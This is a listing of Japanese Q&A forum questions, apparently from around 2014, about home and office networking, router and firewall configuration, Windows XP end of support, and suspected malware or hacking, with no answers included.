知人からの依頼なので、一部内容が不明な点がりますが… 現在会計管理用システム(?POSのような物?)を利用しています。 その管理のためでしょうか、社内の全パソコンの優先DNSサーバが設定されていて、インターネットに接続する際はどうやらそのシステム会社経由で接続しているようです。 それが原因だと思うのですが、光回線が来ているにもかかわらず、Youtubeで動画を見たりソフトなどのデータをダウンロードするのにすごく時間がかかります。 特にファイルをダウンロードする時なのですが、例えばAdobeのFlash playerをダウンロードするのに数時間と表記され、そのままタイムアウトになってしまう、と言うような事が多々あります。 これをどうにかしたいのですが… システムはどうしてもその管理会社につなぐのはOKだとして、ルーターを追加して何か設定することでシステム以外のインターネット接続を自前のプロバイダ経由で接続するように設定等はできないでしょうか? 最終的にはシステムの管理会社と協議する必要があると思いますが、もし可能であればそのように提案してみようと思っています。 こういう事は全然無理なのか、それとも何か特殊なルーターを購入しないと無理なのか、普通にバッファロークラスのルーターでも設定できるのか、Windowsの方で設定できるのか、システムの方を修正してもらうだけの話なのか、その辺を教えていただけるとありがたいです。 余談ですが、職場での動画閲覧・ソフトダウンロードは社長自身が許可をしているので(そんなに大きな会社じゃないので…)、ネットリテラシーが・・・とかセキュリティーが…等の返答は不要です。 よろしくお願いします。
linuxのポート開放での質問です。 特定のIPアドレスからFTPポート（20,21）のみ開放するには、どうすればいいでしょうか。 現在、iptables -A OUTPUT -d [IPアドレス] -j DROP　にて特定のIPアドレスとのI/Oを 停止していますが、このIPアドレスからFTPポートのみ開放する方法を教えてください。
会社のリモートデスクトップに入りたいのですが、添付のポップアップがでてきて、先に進めません。 解除するでも、設定するでも良いのですが、リモートに入れる術をご教授お願いします。 -------------------------- Windowsセキュリティ 資格情報を入力してください ユーザー名 パスワード -------------------------- ※うまく添付できないので必要事項だけ
Dropboxのようなインターフェイスでセキュリティが整った企業向けのクラウドストレージサービスを探しています。どなたかおすすめはないでしょうか。 Google Driveなども検討してみたのですが社内でのトライアル評判もイマイチで代替サービスがないかと思い投稿しました。 顧客やパートナーと大容量ファイルをやり取りする機会も多く、メールでのやり取りのみでは難しいため困っております。 どなたか助けてください・・・。
現在セキュリティソフト、ウイルスバスタークラウドをインストールして使っています、 ネットバンキングを2社を利用しているのですか、各社それぞれSaAT NetizenとPhish Wallをインストールして下さいとの事なのですが、このセキュリティソフトを3個共インストールしてもPCには何の影響もないのですか? (PCの動作が遅くなるとかのその他の影響)
アプリ毎のプロクシ設定が成功したか確認したいのです。 例えばLimeChat…etc
タイトルに入りきらなかったので下記に記します。 「BitTorrent Syncの安全な使用法及び使用帯域について教えて下さい。」 Windows環境にて、BitTorrent Syncにてファイルの同期を行おうと思っていますが、 １．BitTorrent Syncのソフト内でできるよりセキュアな設定方法、 ２．BitTorrent Syncソフトを因数にて設定できるセキュアな使用方法、 ３．その他各種セキュアにできる設定等 どなたかご教授して頂ければと思います。 なお、「BitTorrent Sync」はマルチプラットフォームですが、基本的に使うOSはWindows 7/8/8.1に限定され、それぞれのエディションはHome Premium/Core等一般的に手に入るものを使用します。 Windowsのサーバー系OSは使いません。 セキュリティーについて専門的な知識をそれなりに持った方が解答して頂けると幸いです。
Phish Wall・ウイルスバスタークラウドのセキュリティソフトをスンストールしているのですが、インストールしていても、アドオンを無効にすれば効力はないのですか、インストールをしていればアドオンを無効にしても効力はあるのですか? 教えて下さい。
XPのサポートも後わずかですが、古いPCをXPのまま、メール送信専用（インターネットにはPPPonEでルータを経由せず、プロバイダに単体接続）で使用したいと思っています。 メール送信以外の不必要なサービスを止めればセキュリティ的にもあまり問題ないのかと思っているのですが、お詳しい方、注意点を教えてもらえませんでしょうか？ ちなみに、そのPC上にはとある集計データを１日ごとに固定メアドに自動送信するシステムが動いています。出来るだけ、追加コストを掛けたくないと思っております。あと追加としては、ルータを挟むくらいで何とか行けないかと考えております。
状況を説明します。 ネットワーク内のプライベートIPアドレスは、手動にしている機器と一定の範囲内だけDHCPサーバを使用出来るようルーター側で設定しています。 このネットワーク内で、アクセスポイント機器の「WAPS-APG600H」を使用しています。 「WAPS-APG600H」のIPアドレスは手動で指定しています。 サブネットマスクはルーターと同じ数値が入っています。 デフォルトゲートウェイやDNSサーバーの欄は空欄にしています。 この状態でスマートフォンやタブレット端末をWi-Fi接続できています。そして、普通にインターネットができています。 このとき、iPhone5sでWi-Fiのネットワーク情報を確認すると、「ルーター」「DNS」ともにルーターのIPアドレス（デフォルトゲートウェイ）と同じ数値になっています。 Androidは確認の仕方がわかりません。 デフォルトゲートウェイやDNSサーバーは、ローカルネットワークより外のネットワークと接続するときに必要だと思っていたのですが、アクセスポイント機器の場合は必要ないのでしょうか？ どなたか教えてください。宜しくお願いします。
ここ１週間程、フレッツ光(ひかり電話なし)でネット回線をしいて、Wi-Fiを繋げるためにアレコレとやっていますが全く繋がりませんので質問させていただきました。 既にNTTとプロバイダーとの契約も済んで後は繋げてWi-Fiや無線の設定をするだけなのですが、無線でネットが繋がりません。 有線ではネットに繋ぐことが出来ましたが、無線ルーターとモデムを繋いでWi-Fi設定をしようとしたらルーターがactiveランプが点滅せずに接続が出来ません。再起動したりリセットしたりとしましたが、何も変わりません。 どうしたら良いのでしょうが、パソコンには疎いので分かりやすく解説をお願いします。 モデムはVH-100〈4〉E〈N〉で無線ルーターはNEC社のWR8165Nです。
パソコンにあまり詳しくないのですがxpを使用していることもあり、パソコンのウィルス関連の記事を読んでいて、ふと自分のパソコンはどうかと調べていたところ、ＵＳＢスティックにAUTORUN.FCBというファイル？が見つかり、検索しても海外サイトばかりがヒットし、ウィルスに感染しているのかどうかいまいちよくわかりません。 似たような名前のAutorun.infというものはウィルスを引き起こす要因になるもののようですが、、どなたかおわかりになる方いらっしゃいますか？ もし消した方がよいものならその削除の仕方もご教示いただければと思います。。
どうも、ウィンドウズ７をつかっていますが、最近よく「パソコンがクラッシュ寸前です！」や、「ローカルディスクが機能低下しています！」や、「パソコンが、機能低下しています！」などの、CMがどんなページに入っても、現れます・・・・。 さらに、自分がCMをクリックもしていないのに、そのCMのページが出てきます・・・。 大変しつこいです！ どうすれば、こういうCMがきえるでしょうか？ ノートンをつかっても、消えません（＞-＜） 消す努力でしたこと↓ １．ノートンパワーイレイサーをして、スパイウェアなどかを調べて、検出されなかった。 ２．マウスの副ボタンで、要素も調べて、消してもまたでてきた。 ３．パソコンメモリーを全体調べても、怪しいものなし・・・。 解決方法をなるべく早く知ってる人に教えて欲しいです。 ついでに、使っているインターネットは、「Google Chorome」（グーグル　クローム）です。
会社のネットワークのとある島ですが、島のハブに接続したPCが同時にすべて、ネットワークが10秒ほど遮断される、という現象が出ています。頻度は1時間に1回ほど。 原因はなんだと思われますでしょうか。 原因の範囲が広いと思いますが、ご意見いただければと思います。 以下情報です。 ・PCはすべてWindows 7 Professional ・同じフロアの特定の島しか発生しない ・遮断した際、Windowsでの「接続できません」「切断されました」等のメッセージは出ず、PCが固まったようになる ・PCはインターネット、社内のサーバー、NAS等に接続していますが、それらへの通信すべてが遮断される ・フロア全体のPCの数を合わせてもでもサーバー等への同時接続数上限に全く達していない ・その島のPCのLANケーブルはその島のみのハブに集約され、そのままフロアスイッチにつながっている 　→交換して検証予定 ・PCへのソフトウェアの導入や設定変更は使用者の自由となっている… ・当該PCを別の島で使用するなどしての検証は行っていない
無線ルーターを起動し、パソコンでらくらくスタートをやってるんですけどルーターのpowerだけが緑に光ってステータスは緑の点滅でとにかくうまく起動出来ないんです。誰か助けてください。
私は、ハッキングする(ハッカー) の出所を突き止める人になりたいんですが.... どこにそういう働く場所があるのですか？
他人のパソコンを遠隔操作し、インターネット上で無差別殺人などの犯罪を予告したとして、威力業務妨害罪などに問われた元ＩＴ会社員片山祐輔被告が保釈され記者会見で、 自分のパソコンが真犯人に遠隔操作され、さらに他のパソコンに侵入してハッキングして遠隔操作で犯罪を予告されたとしか考えられない、などと主張していましたが、こういう事は実際に可能なのでしょうか。 可能なら、真犯人がハッキングして他人のパソコンに侵入しそれを遠隔操作して、再びそのパソコンからハッキングして他人のパソコンに侵入しそれを遠隔操作して、みたびそのパソコンからハッキングして他人のパソコンに侵入しそれを遠隔操作して犯行予告を書き込むなんていう事も可能なんですかね？
ビットコインが取られたのはハックされたからということですが、ビットコインを購入されたお客様のお金はどこにいってしまったのでしょう？Mt.Goxの預金には、奪われたビットコインと同じ金額のお金が預金されていそうですが。 誰かわかる方、解説してください。よろしくお願いします。
パソコンを終了する時に、「ディスクの整理をしますか」という表示が現れたのでクリックをしたところ、すぐ終了して、終了した際に、「～メール」の表示が現れて消えましたので、心配です。 これは、不正なプログラムが埋め込まれたのでしょうか。 どなたかお教えください。よろしくお願いします。 もし変なものであれば、このパソコンを放棄したいと思います。
WindowsXPでワイヤレスネットワークの一覧が表示されなくなってしまいネットに接続出来なくなってしまいました。どうすればいいか教えてください。ワイヤレスネットワークの一覧は前までは表示されてました。
Windows XPがサポート終了ですが、XPでしか動かないアプリケーションがあり、対策を考えています。 データを他から移動させる必要があり、ネットワークには留めておきたいのですが、ネットワークの通信を一歩通行にすることはできるでしょうか？ →XPからはネットワーク上のサーバに接続できるが、ネットワーク側からXPにはアクセスできない ワークグループでの運用でXPからインターネットなどへのアクセスは必要ありません。
L-02F のクレードルによる有線接続を使用しPS3とPS4をネットワークに接続しようとしているのですが上手くいきません！ ドコモのmoperaUには加入しています。 あとIPアドレスの取得は出来るのですがインターネットへの接続がうまくいきません(´д｀) L-02Fを持っている方また、ネットワーク機器の設定に詳しい方教えてください！
バッファローのAir Station WHR-HP-G54というルータを使ってMACを使っています。新しいiMacを買ったのでネットにつなぎたいのですが、パスワードを忘れました。ルーター本体の裏にある数字など考えられるものは入れましたが、繋がりません。今、使ってるMac Book Airから知る事はできないでしょうか？
今auのAQUOSを使っているんですが、NAVERをみていたところ写真ような警告がでてきました。 恥ずかしながら、アダルトサイトをみたのは事実です。 全然パソコンとか携帯も詳しくないので、正直どの様に対処していいかわかりません。 とりあえずウイルスバスターは二つついていますが、どちらをスキャンしてもウイルスは検出されません。 ビビって『今すぐウィルスを,…』のところもクリックしてしまいました,… エラーがでたのですが、 逆にそれがまずかったのかも… とか今更ながら後悔しています。 これはまずい状況ですか？ クレジットの情報が漏れてたら怖すぎます… もしウィルス感染していたらどのように対処したらよろしいでしょうか。 よろしくお願いいたします。
会社のコンピュータ（vista）を使ってます。 社内ネットワークは有線でつながっているのですが、以前は他のコンピューターに簡単にアクセス出来たのですが、突然簡単にアクセスできなくなりました。 アクセスするとユーザー名とパスワードを入力してアクセスして下さい。と表示されるようになりました。 しかし、会社からはユーザー名とパスワードを入力してアクセスすることになったとは聞いてません。 詳しい方アドバイスよろしくお願いします。
さっきアメーバブログ退会したんですけどデータが消えません。googleで私のIDを検索したら、まだブログの中のプロフィール写真とか紹介など個人情報が残っていますしブログに入れます。
いつもお世話になっております。 今回お伺いしたいのは、 Ping　IPで通る端末を Ping マシン名で通るようにしたいということです。 XPだとHOSTSに登録したりしてIPとの紐付けをしたと思うのですが、 Ｗｉｎｄｏｗｓ７も同じでしょうか。 ほかのWindows7でPING マシン名が通る端末のHOSTSをみても そのような情報がないように思われるのです。 確認方法や登録方法があれば教えていただけませんでしょうか。
スマホで画像を保存（ダウンロード）した場合、ウイルスには感染するのでしょうか。じつは先日、私のスマホで２ちゃんねるのページを友人に見せていたら、スレッドに貼ってあるエロ画像を勝手に保存されました。色々調べてみると、位置情報などを勝手に送信したり、盗聴されたりするウイルス感染や、なりすましの危険性があることが分かりました。 感染している可能性がある場合、どのようなところに相談するのが良いのでしょうか。友人に安易にスマホを貸した自分が情けないです。どなたか回答お願いします。
CentOS がインストールされたサーバで、メールサーバ（postfix）を運用しています。 昨夜から、他のメールサーバからのスパム報告やセキュリティ報告のメールが多数届くようになりました。 メールのタイトルは下記のようなものです。 Email was Quarantined [Virus Notice] Payroll Invoice **あなたの送信したメールはスパムフィルタによってブロックされました** MDaemon Notification -- Attachment Removed 送信元は多岐にわたっていて、文面から、メールサーバのスパムチェッカやウィルスチェッカが送ってきたメールだと思われます。 拒否メールの宛先（もともとのスパムメールの送信元）は、下記のようにデタラメな英数字で作られていて、スパムであったことが推測されます。（*****.***の部分は実在する私のドメインです） sojournrjm178@*****.*** nagshq@*****.*** unravellingjia@*****.*** 存在しないアカウント宛のメールをすべて1つのアカウントで受信するようにしているので、気がつきました。 それで、踏み台にされているかもしれないと思って maillog を見てみたのですが、上記のメールを受信したログは見つかるのですが、もともとのスパムメールを送信した形跡が見つかりませんでした。 mailq にもそれらしい未送信のキューはありませんでした。 他のサーバから送られてくるセキュリティ警告メールは機械的に処理されるものなので、メールを受信したらすぐに返信されるものだと思っているのですが、送信ログがないのに、警告メールの受信だけが続いている感じです。 昨日まではこのようなことはなかったのですが、昨夜の日付が変わったころから急に発生し結構な頻度で警告メールが送られてきています。 postfix の改ざんも疑うべきでしょうか？ 他にチェック項目とか、対策できる項目は何かありますでしょうか？
Windows2003Serverのドメイン環境を使用しています。 一般ユーザーには管理者権限を与えていないため、インストールに最低限必要な環境のみを用意する管理者権限のアカウントを作成し、必要に応じてこのアカウントを開放して、必要な作業をしてもらう運用にしようと考えています。 前提条件として、インターネットに接続できないような環境を構築することが必要です。 試行錯誤で辿り着いた方法は、 １．IEのインターネットオプションの「接続」タブでプロキシサーバーをダミーにする ２．IEのインターネットオプションの「接続」タブを見えなくする ようなスクリプトをログスクリプトとして起動するようなポリシーを作るというものです。 これは取りあえずはうまくいったのですが、困ったことに、社内サーバーまでがアクセスできなくなってしまいました。hostsファイルで名前解決しているサーバーをhttpで呼ぶ場合は問題無いのですが、社内サーバーからActiveXを配信してインストールする場合は、アクセスできないのです。 IEのコンテンツアドバイザ機能で、接続可能なサーバーを簡単に指定できるようですが、2003のADでは、グループポリシーとして設定できないようです。 ダミーのプロキシではなく、社外サイトへ通さないような設定をしたプロキシを通すのが正攻法だとは思うのですが、そこまでの知識もなく、余分なマシンもないのが実情です。 これ以外にインターネット接続を禁止することのできる方法がありましたら、教えて頂けないでしょうか？（ブラウザはIE限定でもよいと思っています。）
8ポートのギガビットスイッチAがあるとします。 スイッチAを同モデルのスイッチBにカスケード接続しました。 さらにスイッチBから同モデルスイッチCにカスケード接続しました。 それぞれの空きポートには全てPCがつながっているとします。 このやり方で、末端に接続されるPCの台数は何台までいけるのでしょうか？ どこまでカスケード接続できるか(末端PC何台まで接続できるか)を確認するためにはスイッチの指標の何を見ればよいのでしょうか？ 「スイッチングファブリック」がそれにあたるのではと思い、数値を見たら16Gbpsでした。 この数値からどのように接続可能台数を判断したらよいでしょうか？
宜しくお願いします。 子供たちがネットを利用する際、有害サイトなどにアクセスできないように家庭内で規制を掛けたいと思います。 ただ、利用する端末が複数あり、またPCに限らずスマートフォンやテレビ、WiiやPS3といったゲーム機も現在ではネット検索・ブラウジングが可能なものが多々あります。 そこで、ネットワークの大元から何か規制を掛けることは出来ないのでしょうか？ 何といいますか、その対象となるネットワーク環境下で繋がる全ての機器を対象にフィルタリング的なことが出来ればベストなのですが、そういったことは可能なのでしょうか？ それぞれの機器に対して、何かを導入してという方法は存じておりますので、今回はこれ以外の方法と言うことでお願いいたします。 もちろん、これで全ての有害サイトをブロックできるとは思っていませんし、突破する方法も多々存在すると思います。しかし、できる事・すべき事は最大限対応したいと考えております。 どなたか、ネットワーク？規制といいましょうか？？ 大元からの有害サイトブロックについてお詳しいかたいらっしゃいましたら、アドバイスを頂けないでしょうか。宜しくお願いします。
いつもお世話になっております。 どうしてもうまくいかないことがあり、教えていただければと思います。 弊社ではWSUSを導入し、MicrosoftUpdateのページはフィルタリングツールでブロックしています。 既にインストールされてしまったKB2858725(.NET Framework 4.5.1)で一部のシステムに不具合が 発生してしまったため、削除したいです。 クライアントPCはWindows7(32bit)です。 WSUS側で、[インストール済み]となっているKB2858725を[拒否]しました。 KB2858725[コントロールパネル]→[プログラムのアンインストール]から [.NET Framework 4.5.1]をアンインストールし、再起動しました。 しかし、起動後、再度KB2858725(.NET Framework 4.5.1)がインストールされてしまいます。 どうしてでしょうか？重要な更新だからでしょうか？ 一度ダウンロード？インストール？しているからでしょうか？ またどうしても止めたいのですが、止める方法はありますでしょうか？
PS3に無線接続をしていたのですが、パソコンを使って有線接続にしようと思い、現在PS3とパソコンをLANケーブルで繋ぎ接続テストを行い、IPアドレス取得は成功 したんですが ネットワーク接続が失敗し (サーバーへの接続がタイムアウトになりました 80710092)と表示されて ちんぷんかんぷんになってしまいました。 Lavie L LL500/1(WindowsXP) カテゴリー5e クロスケーブル wimaxのモバイルルーターを使用しています なぜネットワーク接続で失敗してしまうのか分かりません、原因が分かる方お願い致します。
ネットサーフィンしてると急に違う「警告!」などどいう画面のサイトに変わったりヤフーのエンタメのボタンから経済のボタンを押しても画面が変わらなかったりします。 急にお気に入りが消えてしまったりして困ってます。ウィルス対策が必要なのでしょうか？ どうしたらよいのでしょうか？
個人・家庭PCのルータは基本的にアウトバウンドしか許可していないと思うのですが、クラッカーはこれをどうやって攻略してくるのでしょうか？
これらの通信で気になる部分はありますか。の続きです。 http://oshiete.goo.ne.jp/qa/8475692.html サブタイトルとしては、PIO病解決したが今度はinterruptが常駐...です。 もはや、カテ違いかと思いますが昨日の続編としてこちらに… －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 動画や音楽聴いたり負荷時、IP消失→再起動かフリーズ ローカルエリア>修復を試す>DNSの登録で停止します(今現在もそうです) ただし、前とは違い業者さんに来てもらい固定IPにしたからかネットに繋がっています。 さらに、固定IPは根本的解決にならないために configを見たり接続関係を弄ったりと色々試してみました。 サービスの内容を1つ1つ調べmsconfig見直しやTCPのプロパティ弄ったり ハードの分解掃除や各ドライバ更新を行って、それでもだめでした。 この段階で2ヶ月経過。 －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 現象は負荷時ということから、タスクマネージャでCPU使用率・メモリ使用量 確認すると、Systemが常時50%となっている事が分かりました。 DualCoreなので2つのCoreうち片方を占有しています。 System調査のためProcessExplorerとKernrateにて覗いてみると intelppmが占有していました。調べるとマイクロソフトや他ブログ様の対処を レジストリで行い、削除。綺麗になりました。 だけど、intelppの代わりに今度はinterruptが50%を占めました。 －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 再度調べなおすと、俗にいうPIO病になるのでは？と推測。 デバイスマネージャのIDE ATA/ATAPI コントローラを調べると たしかにPIOになっているチャネルが１つありました。 PIOの情報はネットに大量にあったのでレジストリから治しました。 その後、プロセッサのドライバ削除で、デバイスマネージャを最適にしました。 －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ しかし、治りませんでした。 PIO病をネットで深いところまで漁りなおして、他の解決方法として 配線変えて掃除してオーディオとCPU削除再起動を行いました。 ※BIOSやM/Bの更新はしていませんが、2001年からしてないので怖い… ※DirectXが原因という方も1人いましたがdxdiagは問題なさそう… 今のところRealteckHDオーディオが毎回ポップで検出されていて消したのを思い出し 再度インストールしてみようと思っている次第です。 情報をこちらにUPするため、今kernrateを覗いたところプロセッサ削除したからか intelppmが占有しています。 RealteckHDオーディオを入れてから、再度intelppm削除。 またプロセッサの削除になったら、更新をしてみます。(LiveUpdate5にて) －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ 少し長かったですが、読んでいただきありがとうございます。 下記に情報を記します。他の情報が必要なら言ってください。 ・kernrateのCPU占有率結果 ----------------------------- OutputResults: KernelModuleCount = 127 Percentage in the following table is based on the Total Hits for the Kernel Time 1902 hits, 25000 events per hit -------- Module Hits msec %Total Events/Sec intelppm 971 2468 51 % 9835899 ntoskrnl 453 2468 23 % 4588735 hal 340 2468 17 % 3444084 epfw 64 2468 3 % 648298 eamon 41 2468 2 % 415316 Ntfs 29 2468 1 % 293760 win32k 2 2468 0 % 20259 USBPORT 1 2468 0 % 10129 nv4_mini 1 2468 0 % 10129 －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ ・デバイスマネージャのIDE ATA/ATAPI コントローラ内容 Intel(R) ICH9 2 port Serial ATA Storage Controller 1 - 2921 Intel(R) ICH9 2 port Serial ATA Storage Controller 2 - 2926 セカンダリ IDE チャネル →３つ表示 プライマリ IDE チャネル →３つ表示(PIO病だった箇所) 標準デュアル チャネル PCI IDE コントローラ －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ ・イベントビュア COM+イベントエラーとVSSエラー (前からなので気にしていない)(システムエラーは無し) －－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－ ・環境 OS:Windows XP Home Edition(なのでDirectX 9.0c) M/B:MS-7360 BIOS:American Megatrends Inc v1.7 電源:剛力 550A-SP CPU:Core2Duo E8500@3.16Ghz1333MHz L2:6MB 65W ソケットLGA775 チップP35 GPU:GTX 460 768MB MEM:3072MB
パソコンがハッキングされているようですが vpnを使うとこでハッキングの対策になりますか？
以前ハッキングされているとここに質問をしたものですが そのときの返事をみて新しくwindowを再インストールをしましたが 相変わらずマウスが勝手に動いたり決まった時間・ たとえば１０時、4：44などの　時間に強制的にログアウトしてしまいます。 昨日新しくインストールしたので時間を決めて自動でログアウトする プログラムは設置されてないはずです。 これはたぶんマンションのネット回線に物理的に何かの仕掛けをしたと思います。 その証拠として数週前から何の問題もなく使っていたvpnが いきなり「接続ができません」と何回も試してもできなくなったんです。 やはり物理的に家の回線をハッキングされたら 対策がありますか？
>netstat -an Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 127.0.0.1:2559 0.0.0.0:0 LISTENING TCP 127.0.0.1:5152 0.0.0.0:0 LISTENING TCP 127.0.0.1:30606 0.0.0.0:0 LISTENING TCP 自分のDhcp割当てIP:1038 91.228.165.44:80 TIME_WAIT TCP 自分のDhcp割当てIP:1039 91.228.166.16:80 TIME_WAIT TCP [::]:135 [::]:0 LISTENING 0 TCP [::1]:30606 [::]:0 LISTENING 0 UDP 0.0.0.0:445 *:* UDP 127.0.0.1:123 *:* UDP 127.0.0.1:45301 *:* UDP 127.0.0.1:48000 *:* UDP 127.0.0.1:48001 *:* UDP 自分のDhcp割り当てIP:123 *:* 先ほどNetBiosをきってWINSも無効にして、445をSMBDeviceEnabled:0にして再起動しました。
ciscoのASA機のアクセスリストの設定・削除方法 ■以下のコマンドであっているのか、知りたいです。 　また注意する点など補足あればお願いします。 まずアクセスリストを下記のように設定します。 ※設定するコマンド例 (config)#access-list A extended permit ip ・・・ (config)#access-list A extended permit ip ・・・ (config)#access-list A extended deny ip any any (config)#access-group A in interface B 次に設定したアクセスリストを変更する手段として、 昔からの方法ですが、 一旦、インターフェースの適用を削除してから、アクセスリストの削除、追加をして、 再度インターフェースに適用するやりかたであってますでしょうか？ ※入力するコマンド例 (config)#no access-group A in interface B (config)#no access-list A (config)# (config)#access-list A extended permit ip ・・・ (config)#access-list A extended permit ip ・・・ (config)#access-list A extended deny ip any any (config)#access-group A in interface B ※Aはアクセスリストの名前、Bはインターフェースグループの名前です。 以上、よろしくお願いします。
一室で多数の無線LANのアクセスポイントがあります。 ある100mx25mの広いオフィスで、壁がない。天井に適当的な無線LANのアクセスポイントが8-10基が適当的な位置にあります。 オフィスは自由席で、普通数十人から百数十人がいます。それぞれのPCは無線LANを使います。スマホも一部無線LANを使います。 回線、設備等のスペックは、平均分布の使いならば、問題ないはずですが、実際にはスピットは低いです、偶にかなり低いです。 問題はどこにありますか？ 一説は、何の電波の影響で、クライアントPCは、ある側の無線LANのアクセスポイントに集中しています為、あれの最大限を超えています。 他の一説は、Office365のスケジューラが、一ユーザでもセッションを多数繋がっています。 何のヒントがありますか？
AOSSのWi-Fiを使っていますが最近繋がりにくく今日、まったく繋がらなくなりました。 無効なWi-Fiです。接続できませんと表示された時とうすれば良いですか？、
セキュリティー（以下「ワクチン」とします。） 私はocn（プロバイダー）を利用しています。 メールから感染するウイルスですが、これってocnだけじゃ安全性が保たれませんか？ 皆さんは駄目だといいますが、どうも理由がわかりません。何故なら、 ocnも １、日本を代表する会社ですから、重たい責任感をもってワクチンを構築していると判断します。 ２、特別、市販のワクチンで二重体制にしてほしいい旨の警告がありません。 ３、ocnも市販の会社もスキルは同じではないかと考えます。よって、二重に搭載する必要はないように思うのですが・・ これはあくまでメールから感染するウイルスの話です。 どうなんでしょうか？メールからの感染のみを考えた場合、二重にワクチンを搭載する必要があるのでしょうか？ 詳しい方、説明お願いします。
ほかのところで質問して若干の回答を得たのですが、あまり技術的でありませんでしたので改めて質問します。 ネットワークでパケットのやり取りをするときSSLやプロバイダの用意するVPNを通じて暗号化することもあるとおもいますが、私を特定するIPアドレスか何かを取得して、その後に続くパケットをコピーし、IPアドレスを他の人のアドレスに改変して他人のPC上に表示することは可能なのでしょうか。他人は私と同じプロバイダ、VPNを使用していると仮定します。 もし可能であるとすれば、どのような方法でこれを防ぐことができるでしょうか。パケット盗聴をしている証拠をつかむためにはこちらから何らかのパケットを送るとか、ログに記録するとかできるのでしょうか。
WindowsXPサポート終了後についての質問です。 仕事でパソコンを利用しています。 メインPCはWindows7　１台 サブPCがWindowsXP　２台です。 現状は、メインのパソコンで、メール・ネットを利用。 サブのXPPCは、メインPCより家庭内LAN経由で共有サーバー内のフォルダに保存したデータを取り出し、仕事をしています。 XPのPCは基本インターネット接続はできなくてもかまいません。 この場合、XPサポート終了後、サブXPPCはインターネット回線を切断し、家庭内LANのみ接続できるようにすればいいと考えておりました。 しかし、色々検索してみると、家庭内LANからでもウイルスに侵される心配もあるようで、どのような対処が一番いいのか困っています。 XPPCは外部からの接続を一切遮断し、データはUSBでやり取りするのは仕事上、手間がかかるため、できるだけやりたくありません。 今まで通り、メインPCからのデータを共有サーバー内のフォルダに保存し、他２台のXPPCから取り出せるようにしたいのです。 このような利用法はセキュリティー上望ましくないのでしょうか。 ご回答をお願いいたします。
添付図のような物理接続で、 ・HSRP(ネットワーク冗長化) ・heartbeat pacemaker(サーバクラスタ) を使い、経路とサーバの冗長化を図りたいと考えています。(論理構成) <条件> ・サーバ1、2でクラスタリングします。 ・1台のcatalystが停止した場合でも、 　もう一台のcatalystを経由して通信ができるようにしたいと考えています。 上記条件を満たしたいとき、 catalyst A、B、C、D、E、Fポート にどういう設定が必要なのでしょうか？ 下記のように考えてみたのですが、HSRPではクラスタ構成に問題が出ると考えています。 ■考え (1)A、Eポートで、VLAN10の設定+SVI10の設定+HSRPの設定 (HSRP 192.168.1.100/24 　catalystX：192.168.1.99/24 　catalystY：192.168.1.98/24 　サーバ1IP：192.168.1.1/24 ) (2)B、Fポートで、VLAN20の設定+SVI20の設定+HSRPの設定 (HSRP 192.168.2.100/24 　catalystX：192.168.2.99/24 　catalystY：192.168.2.98/24 　サーバ2IP：192.168.2.1/24 ) (3)サーバ1で、(1)の設定したHSRPを、デフォルトゲートウェイに設定する。 　サーバ1 デフォルトゲートウェイ：192.168.1.100/24(VLAN10のHSRP） (4)サーバ2で、(2)の設定したHSRPを、デフォルトゲートウェイに設定する。 　サーバ2 デフォルトゲートウェイ：192.168.2.100/24(VLAN20のHSRP） (5)C、Dポートはtrunkで、Vlan10、20を通す許可を設定。 考えた内容で実施すると、サーバA、Bでネットワークセグメントが異なりクラスタを構成できなくなる と考えています。 ・サーバA：192.168.1.0/24 セグメント ・サーバB：192.168.2.0/24 セグメント →AとBでセグメントが不一致、クラスタ作成不可。 もしかして添付図のような物理構成で冗長化を組もうとすると、 HSRPではなく、スタック接続(3750以上)の機械で構成しないとだめなのでしょうか？ ご教授お願いします。
電子機器の受注生産を行っている会社で、１社ではなく、複数の会社から受注して生産しています。 その内の何社かは、情報セキュリティ対策ガイドラインを親会社より作成、構築・運用するよう指示がでています、ゆくゆくは、孫受けである当社に波及してくるのではと感じています。 パソコン関連で共通しているのが、パスワードの一元管理が入っています。 ・ワークグループだと、端末PC、ファイルサーバ、メールサーバ、１人同一IDで利用する際、使用するPC(サーバ、端末関係なく）すべてに同一IDを登録しパスワードを同じにし、変更する際全てを変える必用がある。 パスワードの一元管理を行うことで、パスアワードの変更は１回のみ行えば良い、こうしないと、月に１回以上パスワードの変更をしなさい、類推されにくいパスワードを設定しなさいは、決めても守られない。 ・端末PCにデータを保存出来ないように（盗難・紛失対策）しなさい。 他にも指摘事項は、結構あり、ワークグループでルールを決めて運用し始めましたが一向に親会社からの指摘事項がクリアされず、取引先は、AD(ActiveDirecotory)の導入に踏み切ったそうです。 ADは必須なんでしょうか？
私はiPadを持っているんですが、アプリがどうしても消せません。 消し方自体は分かっています。 アプリを消す時にそのアプリを長押ししますよね？ そのときにアプリの左上に×がでるんですが×、を押すとなぜか何をどうしても動かないのです 長押しして動かしたり、まとめたりはできます だけど、×を押すと絶対に固まります 1分くらい経つと、画面にApple社のマークが映ります Apple社のマークが映ってからしばらくすると、ロック画面に戻ります そしてまたアプリを消そうとすると動かなくなるのです 設定画面からも消そうとしてみたのですが 一般の使用状況をタップしても動かなくなります (ホーム画面には戻れる) しかも、Twitterやアルバムが見れません 正確には全然読み込みしません ずっと待っていても全く画面が変わらないのです ホームボタンを押すとホーム画面にもどります… これは一体なんなんでしょうか？ ウイルスでしょうか？ それともほっとけば直りますか？ もしウイルスだったりしたら怖くて心配です 回答よろしくお願いします…
盗撮器を家の外に仕掛けたとしてそれで家の中は見れますか？
